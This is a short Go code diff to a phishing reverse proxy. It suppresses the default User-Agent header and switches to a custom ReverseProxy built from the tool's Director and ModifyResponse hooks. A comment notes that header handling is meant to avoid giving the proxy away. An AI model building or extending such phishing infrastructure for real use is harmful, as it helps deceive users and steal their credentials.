@@ -31,6 +31,11 @@ func (p *phishingProxy) Director(request *http.Request) {
 		request.Header.Set("Referer", referer)
 	}
 
+	if _, ok := request.Header["User-Agent"]; !ok {
+		// explicitly disable User-Agent so it's not set to default value
+		request.Header.Set("User-Agent", "")
+	}
+
 	// Don't let a stray origin header give us away either.
 	origin := request.Header.Get("Origin")
 	if origin != "" {
@@ -115,10 +120,11 @@ func New(config *Config) *ProxyServer {
 		Logger:               config.Logger,
 	}
 
-	reverseProxy := httputil.NewSingleHostReverseProxy(config.TargetURL)
-	reverseProxy.Director = phishingProxy.Director
-	reverseProxy.ModifyResponse = phishingProxy.ModifyResponse
-	reverseProxy.Transport = config.Transport
+	reverseProxy := &httputil.ReverseProxy{
+		Director:       phishingProxy.Director,
+		ModifyResponse: phishingProxy.ModifyResponse,
+		Transport:      config.Transport,
+	}
 
 	return &ProxyServer{
 		reverseProxy: reverseProxy,
